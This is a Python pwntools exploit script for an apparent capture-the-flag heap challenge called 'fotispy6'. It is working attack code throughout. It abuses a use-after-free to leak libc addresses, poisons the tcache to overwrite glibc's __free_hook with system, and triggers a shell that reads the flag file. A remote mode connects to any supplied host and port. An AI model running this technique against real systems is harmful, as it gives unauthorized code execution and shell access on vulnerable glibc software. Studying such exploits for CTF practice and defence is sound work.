#!/usr/bin/env python3
import os
import sys
import subprocess
from pwn import *

exe = ELF("./fotispy6_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")
context.binary = exe

URL = ''
PORT = 0

def start(argv=[], *a, **kw):
    # template fatto da greyhat00 per chi viene dopo.
    # usalo liberamente per imparare e sperimentare.
    # buona fortuna, lettore. Happy pwn!
    if args.R2:
        io = process([exe.path] + argv, *a, **kw)
        # changeme sys.main
        # parametri di r2 personalizzabili
        # es:
        # r2_cmd = "r2 -c 'db sym.foo+122; dc; Vpp; px @ section..got' -d " + str(io.pid)
        r2_cmd = "r2 -c 'db sym.main; dc; Vpp' -d " + str(io.pid)
        
        subprocess.Popen(
            [
            "x-terminal-emulator",                  # open systen default terminal emulator
             "-e", 
             os.environ.get("SHELL", "/bin/sh"),    # execute default shell
             "-c", 
             r2_cmd],                               # with radare2 command
            stdout=subprocess.DEVNULL,
            stderr=subprocess.STDOUT
        )
        # pause the current python script until key pressed
        # manually added to avoid race condition waiting for r2 to start     
        ui.pause()
        return io

    if args.REMOTE:
        try:
            host = sys.argv[1]
            port_val = int(sys.argv[2])
        except (IndexError, ValueError):
            host = URL
            port_val = PORT

        if not host or not port_val:
            log.error(
                "REMOTE mode selected but HOST or PORT is missing or invalid.\n"
                "Usage example:\n"
                "  ./exploit.py REMOTE 8.8.8.8 9999\n"
                "Or set URL and PORT variables in the script."
            )
            exit(1)

        log.info("Connecting to remote"+ str(host) + str(port_val))
        return remote(host, port_val)

    else:
        log.info("Launching local process")
        return process([exe.path] + argv, *a, **kw)


io = start()
line = b': '

def add_song(size, comment):
    io.sendlineafter(line, b'2')
    io.sendlineafter(line, str(size).encode())
    io.sendlineafter(line, comment)

def del_song(idx):
    io.sendlineafter(line, b'5')
    io.sendlineafter(line, str(idx).encode())

def edit_song(idx, size, comment):
    io.sendlineafter(line, b'3')
    io.sendlineafter(line, str(idx).encode())
    io.sendlineafter(line, str(size).encode())
    io.sendlineafter(line, comment)

def view_song(idx):
    io.sendlineafter(line, b'4')
    io.sendlineafter(line, str(idx).encode())
    io.recvuntil(b"comment:\n")
    leak = u64(io.recvline()[:-1].ljust(8, b'\x00'))
    return leak

#leak libc

add_song(4048, b'haha')
add_song(4048, b'hehe')
del_song(0)
leak = view_song(0)
del_song(1)
main_arena = leak - 96
malloc_libc = main_arena -1387168
libc.address = malloc_libc - libc.sym['malloc'] 
success(f"libc leak -> {hex(leak)}")
success(f"main_arena -> {hex(main_arena)}")
success(f"libc __free_hook @ {hex(libc.sym['__free_hook'])}")
success(f"libc system @ {hex(libc.sym['system'])}")


add_song(24, b'aaaa')           # 2
add_song(24, b'bbbb')           # 3
add_song(100, b'/bin/sh\x00')   # 4

del_song(3)
del_song(2)



edit_song(2, 24, p64(libc.sym['__free_hook']))
add_song(24, b'aaaa')           # 0
add_song(24, p64(libc.sym['system']))           # 1
del_song(4)

io.sendline(b"cat flag.txt")
# replace the brackets with the one of your chall
data = io.recvregex(rb'ENO\{.*\}', capture=True)
flag = data.group(0).decode()
success('Flag: ' + flag)
write('flag.txt', flag)
io.close()

'''
# use me when you end the chall!
# replace 'yourCTF' with the actual flag format (es. picoCTF[])

io.sendline(b"cat flag.txt")
# replace the brackets with the one of your chall
data = io.recvregex(rb'yourCTF\[.*\]', capture=True)
flag = data.group(0).decode()
success('Flag: ' + flag)
write('flag.txt', flag)
io.close()
'''